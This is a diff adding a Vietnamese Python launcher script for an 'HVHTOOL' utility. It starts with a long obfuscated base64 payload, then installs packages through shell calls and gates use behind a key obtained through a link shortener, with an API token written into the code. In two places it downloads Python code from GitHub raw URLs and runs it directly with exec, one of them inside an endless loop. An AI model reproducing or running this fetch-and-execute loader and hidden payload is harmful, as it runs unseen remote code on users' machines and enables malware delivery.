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'))))
+try:
+    import requests,os,sys
+except ImportError:
+    os.system("pip3 install requests --break-system-packages")
+    os.system("pip3 install requests")
+    os.system("pip install requests")
+    os.system("pip install bs4")
+    os.system("pip3 install bs4 --break-system-packages")
+    print('__Vui Lòng Chạy Lại Tool__')
+    sys.exit()
+den = "\033[1;90m"
+luc = "\033[1;32m"
+trang = "\033[1;37m"
+red = "\033[1;31m"
+vang = "\033[1;33m"
+tim = "\033[1;35m"
+lamd = "\033[1;34m"
+lam = "\033[1;36m"
+hong = "\033[1;95m"
+thanh_xau= trang + red + "[" + vang+ "⟨⟩" + red + "] " + trang + "➩ "
+thanh_dep= trang + red + "[" + luc + "✓" + red + "] " + trang + "➩ "
+xnhac = "\033[1;36m"
+do = "\033[1;31m"
+luc = "\033[1;32m"
+vang = "\033[1;33m"
+xduong = "\033[1;34m"
+tim = '\033[1;39m'
+hong = "\033[1;35m"
+trang = "\033[1;37m"
+whiteb = "\033[1;37m"
+red = "\033[0;31m"
+redb = "\033[1;31m"
+end = '\033[0m'
+import os,sys
+os.system('cls')
+banner = f""" 
+\033[0;31m██╗░░██╗██╗░░░██╗██╗░░██╗  ████████╗░█████╗░░█████╗░██╗░░░░░
+\033[1;32m██║░░██║██║░░░██║██║░░██║  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
+\033[1;39m███████║╚██╗░██╔╝███████║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
+\033[1;34m██╔══██║░╚████╔╝░██╔══██║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
+\033[1;33m██║░░██║░░╚██╔╝░░██║░░██║  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗
+\033[1;34m╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝
+\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
+\033[1;39m┌────────────────────── Bé Tập Code TOOL ──────────────────────┐
+\033[1;32m║   \033[1;39mTOOL BY\033[1;32m            :  Bé Tập Code                          \033[1;32m║
+\033[1;32m║   \033[1;39mYOUTUBER\033[1;32m           :  HVHTOOL                         \033[1;32m     ║
+\033[1;32m║   \033[1;39mYOTUBE_LINK\033[1;32m        :  https://www.youtube.com/@HVHTOOL\033[1;32m     ║
+\033[1;39m└──────────────────────────────────────────────────────────────┘
+\033[1;39m┌────────────────────── Bé Tập Code TOOL ──────────────────────┐
+\033[1;32m║ * Nhập 1 để setup thư viện cho pc 
+\033[1;32m║ * Nhập 2 để setup thư viện cho pc nếu 1 lỗi
+\033[1;32m║ * Nhập 3 để setup thư viện cho teramux \033[1;31m(ubuntu)
+\033[1;32m║ * Nếu teramux không dùng ubuntu thì Dùng 1,2
+\033[1;32m║ * setup thư việt 1 lần ai setup rồi thì không pk chạy lại nữa
+\033[1;32m║ *\033[1;97m TOOL ĐƯỢC CẬP NHẬT VÀO 24/6/2025 
+\033[1;32m║ *\033[1;97m TOOL XỄ ĐƯỢC CẬP NHẬT VÀ CHỈNH SỬA FIX LỖI LIÊN TỤC MN VÀO NHÓM DISCORD CẬP NHẬT THƯỜNG XUYÊN THÉ 
+\033[1;32m║ *{tim} --> \033[1;31m Enter để vào tool
+\033[1;32m║ *{tim} --> \033[1;31m Enter để vào tool
+\033[1;39m└──────────────────────────────────────────────────────────────┘"""
+print(banner)
+#print(banner1)
+text = "[<@=@>]"
+
+colors = [
+    "\033[1;31m",  # Đỏ
+    "\033[1;32m",  # Xanh lá
+    "\033[1;33m",  # Vàng
+    "\033[1;34m",  # Xanh dương
+    "\033[1;35m",  # Tím
+    "\033[1;36m",  # Xanh ngọc
+    "\033[1;91m",  # Đỏ sáng
+    "\033[1;92m",  # Xanh lá sáng
+    "\033[1;93m",  # Vàng sáng
+]
+
+# Gộp các ký tự và mã màu thành một chuỗi duy nhất
+colored_text = "".join(f"{colors[i % len(colors)]}{c}" for i, c in enumerate(text)) + "\033[0m"
+
+# In ra 1 dòng
+setup=input(f'{colored_text}{vang} Nhập setup:')
+if setup == '1':
+    import os,sys
+    os.system("pip install requests")
+    os.system("pip install art")
+    os.system("pip install colorama")
+    os.system("pip install tabulate")
+    os.system("pip install bs4")
+    os.system("pip install lxml")
+    os.system("pip install beautifulsoup4")
+    os.system("pip install random-user-agent")
+    os.system("pip install pystyle")
+    os.system("pip install curl_cffi")
+    os.system("pip install random2")
+    os.system("pip install selenium")
+    os.system("pip install DateTime")
+    os.system("pip install threaded")
+    os.system("pip install thread")
+    os.system("pip install urllib3")
+    os.system("pip install faker requests colorama bs4 pystyle")
+    os.system("pip install requests pysocks")
+    print('__Vui Lòng Chạy Lại Tool__')
+    sys.exit()
+elif setup == '2':
+    import os,sys
+    os.system("pip3 install requests")
+    os.system("pip3 install art")
+    os.system("pip3 install colorama")
+    os.system("pip3 install tabulate")
+    os.system("pip3 install bs4")
+    os.system("pip3 install lxml")
+    os.system("pip3 install beautifulsoup4")
+    os.system("pip3 install random-user-agent")
+    os.system("pip3 install pystyle")
+    os.system("pip3 install curl_cffi")
+    os.system("pip3 install random2")
+    os.system("pip3 install selenium")
+    os.system("pip3 install DateTime")
+    os.system("pip3 install threaded")
+    os.system("pip3 install thread")
+    os.system("pip3 install urllib3")
+    os.system("pip3 install faker requests colorama bs4 pystyle")
+    os.system("pip3 install requests pysocks")
+    print('__Vui Lòng Chạy Lại Tool__')
+    sys.exit()
+elif setup == '3':
+    import os, sys
+    os.system("pip3 install requests --break-system-packages")
+    os.system("pip3 install art --break-system-packages")
+    os.system("pip3 install colorama --break-system-packages")
+    os.system("pip3 install tabulate --break-system-packages")
+    os.system("pip3 install bs4 --break-system-packages")
+    os.system("pip3 install beautifulsoup4 --break-system-packages")
+    os.system("pip3 install lxml --break-system-packages")
+    os.system("pip3 install random-user-agent --break-system-packages")
+    os.system("pip3 install pystyle --break-system-packages")
+    os.system("pip3 install curl_cffi --break-system-packages")
+    os.system("pip3 install random2 --break-system-packages")
+    os.system("pip3 install selenium --break-system-packages")
+    os.system("pip3 install DateTime --break-system-packages")
+    os.system("pip3 install threaded --break-system-packages")
+    os.system("pip3 install thread --break-system-packages")
+    os.system("pip3 install urllib3 --break-system-packages")
+    os.system("pip3 install faker requests colorama bs4 pystyle --break-system-packages")
+    os.system("pip3 install requests pysocks --break-system-packages")
+    print('__Vui Lòng Chạy Lại Tool__')
+    sys.exit()
+elif setup == '':
+
+    try:
+        exec(requests.get('https://raw.githubusercontent.com/Hoanghuy200/Hoanghuy/refs/heads/main/HVHTOOLkey1.py').text)
+    except:
+        print('viu lòng chạy lại!!!')
+
+
+else:
+    print('nhập sai ???')
+
+import base64
+import os
+import time
+import json
+from curl_cffi import requests
+import sys
+import random
+from time import sleep
+from datetime import datetime, timedelta
+from concurrent.futures import ThreadPoolExecutor
+
+# Tạo hoặc đọc khóa mã hóa bằng base64
+secret_key = base64.urlsafe_b64encode(os.urandom(32))
+
+# Mã hóa và giải mã dữ liệu bằng base64
+def encrypt_data(data):
+    return base64.b64encode(data.encode()).decode()
+
+def decrypt_data(encrypted_data):
+    return base64.b64decode(encrypted_data.encode()).decode()
+
+# Màu sắc cho hiển thị
+xnhac = "\033[1;36m"
+do = "\033[1;31m"
+luc = "\033[1;32m"
+vang = "\033[1;33m"
+xduong = "\033[1;34m"
+hong = "\033[1;35m"
+trang = "\033[1;39m"
+bold = "\033[1m"  # Added bold ANSI escape code
+end = '\033[0m'
+
+def banner():
+    # Clear console screen based on OS
+    os.system('cls' if os.name == 'nt' else 'clear')
+    banner = f""" 
+\033[0;31m██╗░░██╗██╗░░░██╗██╗░░██╗  ████████╗░█████╗░░█████╗░██╗░░░░░
+\033[1;32m██║░░██║██║░░░██║██║░░██║  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
+\033[1;31m███████║╚██╗░██╔╝███████║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
+\033[1;32m██╔══██║░╚████╔╝░██╔══██║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░
+\033[1;31m██║░░██║░░╚██╔╝░░██║░░██║  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗
+\033[1;32m╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝
+\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
+\033[1;39m┌────────────────────── Bé Tập Code TOOL ──────────────────────┐
+\033[1;32m║   \033[1;39mTOOL BY\033[1;32m            :  Bé Tập Code                          \033[1;32m║
+\033[1;32m║   \033[1;39mYOUTUBER\033[1;32m           :  HVHTOOL                         \033[1;32m     ║
+\033[1;32m║   \033[1;39mYOTUBE_LINK\033[1;32m        :  https://www.youtube.com/@HVHTOOL\033[1;32m     ║
+\033[1;39m└──────────────────────────────────────────────────────────────┘
+\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
+"""
+    for X in banner:
+        sys.stdout.write(X)
+        sys.stdout.flush()
+        sleep(0.000001)
+
+def get_ip_address():
+    try:
+        response = requests.get('https://api.ipify.org?format=json')
+        ip_data = response.json()
+        ip_address = ip_data['ip']
+        return ip_address
+    except Exception as e:
+        print(f"Lỗi khi lấy địa chỉ IP: {e}")
+        return None
+
+def display_ip_address(ip_address):
+    if ip_address:
+        banner()
+        print(f"\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;31mĐịa chỉ IP : {ip_address}")
+    else:
+        print("Không thể lấy địa chỉ IP của thiết bị.")
+
+def luu_thong_tin_ip(ip, key, expiration_date):
+    data = {ip: {'key': key, 'expiration_date': expiration_date.isoformat()}}
+    encrypted_data = encrypt_data(json.dumps(data))
+    with open('ip_key.json', 'w') as file:
+        file.write(encrypted_data)
+
+def tai_thong_tin_ip():
+    try:
+        with open('ip_key.json', 'r') as file:
+            encrypted_data = file.read()
+        data = json.loads(decrypt_data(encrypted_data))
+        return data
+    except FileNotFoundError:
+        return None
+
+def kiem_tra_ip(ip):
+    data = tai_thong_tin_ip()
+    if data and ip in data:
+        expiration_date = datetime.fromisoformat(data[ip]['expiration_date'])
+        if expiration_date > datetime.now():
+            return data[ip]['key']
+    return None
+
+def generate_key_and_url(ip_address):
+    ngay = int(datetime.now().day)
+    key1 = str(ngay * 27 + 27)
+    ip_numbers = ''.join(filter(str.isdigit, ip_address))
+    key = f'HVH{key1}{ip_numbers}'
+    expiration_date = datetime.now().replace(hour=23, minute=59, second=0, microsecond=0)
+    url = f'https://hohiepvn.x10.mx/key/van-thang-vip.php?key={key}'
+    return url, key, expiration_date
+
+def da_qua_gio_moi():
+    now = datetime.now()
+    midnight = now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)
+    return now >= midnight
+
+def get_shortened_link_phu(url):
+    try:
+        token = "667294c6bf2cd922507983c4"
+        api_url = f"https://link4m.co/api-shorten/v2?api={token}&url={url}"
+        response = requests.get(api_url, timeout=5)
+        if response.status_code == 200:
+            data = response.json()
+            return data
+        else:
+            return {"status": "error", "message": "Không thể kết nối đến dịch vụ rút gọn URL."}
+    except Exception as e:
+        return {"status": "error", "message": f"Lỗi khi rút gọn URL: {e}"}
+
+def main():
+    global code
+    prefix = "HVH156XDTNL912"
+    suffix = ''.join(random.choices('0123456789', k=16))
+    code = prefix + suffix
+    try:
+        with open("ch.txt", "w") as file:
+            file.write(f"{code}")
+    except Exception as e:
+        print(f"Lỗi khi khởi tạo: {e}")
+
+    try:
+        keydis = requests.get('https://raw.githubusercontent.com/shopaccrandom/md/refs/heads/main/modun_setup/modun_0368tedj7bzxkn3cevtp/nodun_28sr2ocxwnerfkr4dnvs.txt').text.strip()
+    except:
+        print('Lỗi khi tạo key trên Discord')
+        keydis = None
+
+    try:
+        with open("key.txt", "r", encoding="utf-8") as file:
+            keydiscord = file.read()
+    except:
+        ip_address = get_ip_address()
+        display_ip_address(ip_address)
+
+    if ip_address or (keydis and keydis == keydiscord):
+        existing_key = kiem_tra_ip(ip_address)
+        if existing_key:
+            print(f"\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;35mTool còn hạn, mời bạn dùng tool...")
+            time.sleep(2)
+        else:
+            if da_qua_gio_moi():
+                print("\033[1;33mQuá giờ sử dụng tool !!!")
+                return
+
+            print("\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;32mNhập 1 Để Lấy Key (Free) hoặc 2 Để Nhập Key ADMIN \033[1;33m")
+            try:
+                choice = input("\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;34mNhập lựa chọn: ")
+                print("\033[97m════════════════════════════════════════════════")
+                if choice not in ["1", "2"]:
+                    print("Vui lòng nhập số hợp lệ (1 hoặc 2).")
+                    return
+            except KeyboardInterrupt:
+                print("\n\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;31mCảm ơn bạn đã dùng Tool !!!")
+                sys.exit()
+
+            if choice == "2":
+                while True:
+                    try:
+                        keynhap = input('\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;33mNhập Key ADMIN: \033[1;32m')
+                        if keydis and keynhap == str(keydis):
+                            with open("file.txt", "w", encoding="utf-8") as file:
+                                file.write(keynhap)
+                            print('Key ADMIN Đúng Mời Bạn Dùng Tool')
+                            sleep(2)
+                            luu_thong_tin_ip(ip_address, keynhap, datetime.now().replace(hour=23, minute=59, second=0, microsecond=0))
+                            return
+                        else:
+                            print('\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;31mKey ADMIN Sai, Vui Lòng Nhập Lại!')
+                    except KeyboardInterrupt:
+                        print("\n\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;31mCảm ơn bạn đã dùng Tool !!!")
+                        sys.exit()
+
+            while True:
+                url, key, expiration_date = generate_key_and_url(ip_address)
+                with ThreadPoolExecutor(max_workers=2) as executor:
+                    yeumoney_future = executor.submit(get_shortened_link_phu, url)
+                    yeumoney_data = yeumoney_future.result()
+                    if yeumoney_data and yeumoney_data.get('status') == "error":
+                        print(yeumoney_data.get('message'))
+                        return
+                    else:
+                        link_key_yeumoney = yeumoney_data.get('shortenedUrl')
+                        print('\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;35mLink Để Vượt Key Là \033[1;36m:', link_key_yeumoney)
+
+                    start_time = time.time()
+                    try:
+                        keynhap = input('\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;33mKey Đã Vượt Là: \033[1;32m')
+                        elapsed_time = time.time() - start_time
+                        if elapsed_time < 60:
+                            print('\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;31mCó hành vi bypass! Vui lòng dùng link mới.')
+                            continue
+                        if keynhap == key or (keydis and keynhap == str(keydis)):
+                            with open("file.txt", "w", encoding="utf-8") as file:
+                                file.write(keydis if keydis else keynhap)
+                            print('Key Đúng Mời Bạn Dùng Tool')
+                            sleep(2)
+                            luu_thong_tin_ip(ip_address, keynhap, expiration_date)
+                            return
+                        else:
+                            print('\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;35mKey Sai Vui Lòng Vượt Lại Link \033[1;36m:', link_key_yeumoney)
+                            start_time = time.time()
+                    except KeyboardInterrupt:
+                        print("\n\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;31mCảm ơn bạn đã dùng Tool !!!")
+                        sys.exit()
+
+
+if __name__ == "__main__":
+    main()
+while True:
+    try:
+        if not os.path.exists("ch.txt"):
+            print("không tồn tại.") 
+        with open("ch.txt", "r", encoding="utf-8") as file:
+            first_line = file.readline().strip()
+            print(first_line)
+            print(code)
+            
+            if first_line and first_line == code:
+                print("là số 1.")
+
+                time.sleep(2)
+                try:
+                    url ='https://raw.githubusercontent.com/shopaccrandom/jjjjjjjj/refs/heads/main/goc/hvhtool.py'
+                    response = requests.get(url)
+                    response.raise_for_status()  # Check for HTTP errors
+                    exec(response.text)  # Execute the fetched script
+                
+                except Exception as e:
+                    print(f"Lỗi khi thực thi script từ URL {url}: {e}")
+                
+            else:
+                print("không phải là số 1.")
+            
+    except KeyboardInterrupt:
+        print("\n\033[1;97m[\033[1;91m❣\033[1;97m] \033[1;36m✈  \033[1;31mCảm ơn bạn đã dùng Tool của AD")
+        sys.exit()
